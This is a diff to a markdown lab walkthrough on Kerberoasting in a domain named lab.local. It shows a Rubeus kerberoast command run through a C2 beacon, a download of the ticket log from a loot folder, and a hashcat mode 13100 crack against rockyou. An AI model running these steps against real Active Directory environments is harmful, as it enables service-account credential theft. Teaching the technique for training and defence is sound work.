@@ -144,7 +144,7 @@ Written in C#, it's often used for ticket abuse, hash extraction, and Kerberoast
 ## Step-by-Step (Using Rubeus)
 1. Inline-execute Rubeus on a target:
 ```beacon
-dotnet inline-execute /home/kali/tools/Rubeus.exe kerberoasting /domain:lab.local /outfile:krb_rubeus.log
+dotnet inline-execute /home/kali/tools/Ghostpack-CompiledBinaries/Rubeus.exe kerberoast /domain:lab.local /outfile:krbdebug.log
 ```
 
 ![image](https://github.com/user-attachments/assets/ee425a66-a703-4a6d-9434-c7d7d402ba5c)
@@ -155,17 +155,23 @@ dotnet inline-execute /home/kali/tools/Rubeus.exe kerberoasting /domain:lab.loca
 download c:\loot\krbdebug.log
 ```
 
+<img width="1016" height="603" alt="image" src="https://github.com/user-attachments/assets/8d74ddee-489b-4fd7-b683-65c83275c8d4" />
+
+3. Find and copy the file `krbdebug.log` to another folder:
+
+<img width="964" height="655" alt="image" src="https://github.com/user-attachments/assets/042db310-74d8-47a3-99bb-7ec570f60257" />
+
 Let's crack the hashes using [Hashcat](https://github.com/hashcat/hashcat)
 
-3. Execute `hashcat` in the same folder where you saved the output file `krbdebug.log`:
+4. Execute `hashcat` in the same folder where you saved the output file `krbdebug.log`:
 ```bash
-hashcat -m 13100 -a 0 krbroast.txt /usr/share/wordlists/rockyou.txt.gz --potfile-path=new.pot --outfile=cracked.txt --status -O
+hashcat -m 13100 -a 0 krbdebug.log /usr/share/wordlists/rockyou.txt.gz --potfile-path=new.pot --outfile=cracked.txt --status -O
 ```
 
 ![image](https://github.com/user-attachments/assets/ff144424-7575-4e59-a758-618b49d9c1ad)
 
 
-4. Open the file `cracked.txt` to check for the cracked passwords.
+5. Open the file `cracked.txt` to check for the cracked passwords.
 
 ![image](https://github.com/user-attachments/assets/77e179c8-6e60-45df-86e0-5d014cac9e1a)
 
